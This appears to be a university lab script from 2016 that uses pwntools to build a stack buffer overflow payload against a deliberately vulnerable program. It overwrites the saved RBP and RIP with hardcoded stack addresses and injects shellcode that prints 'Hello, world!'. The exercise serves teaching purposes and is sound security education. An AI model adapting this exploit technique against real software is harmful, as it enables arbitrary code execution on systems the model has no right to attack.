#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016

from pwn import *

# (Cheat) Reading the code from vulnapp.c, the buffer for the input is 64 bytes. Hence, we know that by putting an input of 64 bytes, all the buffer will be eaten up.
# After filling up the buffer, the RBP and RIP addresses will be overwritten subsequently. 
lenfill = 64 # or some other value

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. pwnlib is used to turn int to string

storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex

# When running inside GDB
# Result from running original script and use info frame: rbp at 0x7fffffffde80, rip at 0x7fffffffde88
# Hence, to point to the address that contains the payload, add 8 (dec) into the rip address. 
storedRIPgdb = p64(0x7fffffffde90) # EEEEEEEE in hex

# When directly running on shell
# Result from running original script, using gdp ./vulnapp core and info frame 0: rbp at 0x7fffffffded0, rip at 0x7fffffffded8
# Hence, to point ot the address that contains the payload, add 8 (dec) into the rip address.
storedRIP = p64(0x7fffffffdee0) # EEEEEEEE in hex


# For payload, we need to add {b'\n'} to complete the line. Or else, an memory access error will pop up 
with open('payloadgdb','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload + b'\n')

with open('payload','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload + b'\n')

